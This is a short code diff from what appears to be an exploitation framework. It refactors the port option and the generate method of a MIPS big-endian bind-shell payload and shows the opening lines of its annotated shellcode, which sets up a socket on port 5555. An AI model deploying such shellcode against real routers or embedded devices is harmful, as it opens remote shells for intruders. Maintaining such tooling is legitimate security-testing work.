@@ -18,12 +18,15 @@ class Exploit(payloads.Payload):
     }
 
     architecture = "mipsbe"
-    port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
+
+    port = exploits.Option(
+        5555, 'Bind Port', validators=validators.convert_port
+    )
 
     def generate(self):
-        bind_port = self.convert_port(self.port)
+        bind_port = validators.convert_port(self.port)
 
-        self.payload = (
+        return (
             # socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
             "\x27\xbd\xff\xe0" +        # addiu   sp,sp,-32
             "\x24\x0e\xff\xfd" +        # li      t6,-3
